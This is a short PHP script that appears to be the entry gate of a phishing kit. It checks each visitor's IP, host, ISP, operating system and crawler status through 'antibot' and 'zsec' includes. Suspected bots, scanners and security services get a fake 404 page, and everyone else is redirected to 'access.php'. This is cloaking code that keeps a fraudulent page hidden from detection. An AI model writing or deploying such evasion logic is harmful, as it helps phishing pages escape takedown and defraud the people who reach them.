<?php

    session_start();
    include 'crawlerdetect.php';
    include './zsec.php';
    require_once './src/Classes/Comp.php';
    require_once './src/Classes/Antibot.php';
    require_once './src/vendor/autoload.php';

    use Jaybizzle\CrawlerDetect\CrawlerDetect;
    use Jaybizzle\ReferralSpamDetect\ReferralSpamDetect;
    $comps = new Comp;
    $antibot = new Antibot;
    $antibotList = new IpBlockList;
    $spider = new Spider;
    $crawler = new CrawlerDetect;

    $_SESSION['ip'] = $comps->getIP();
    $settings = $comps->settings();
    $comps->createValue();

    if (!$comps->localhost($_SESSION['ip'])) {
        if ($spider->checkSpider()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($antibot->checkHost()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($antibot->checkISP()) {
            echo $antibot->throw404();
            die();
        }
    
        if ($comps->getOS() == "Windows Server 2003/XP x64" || $comps->getOS() == "Windows 2000") {
            echo $antibot->throw404();
            die();
        }
            
        if ($crawler->isCrawler()) {
            echo $antibot->throw404();
            die();
        }
    
        if (!$antibotList->ipPass($_SESSION['ip'])) {
            echo $antibot->throw404();
            die();
        }
    }

    $comps->headerX("./access.php");


	?>
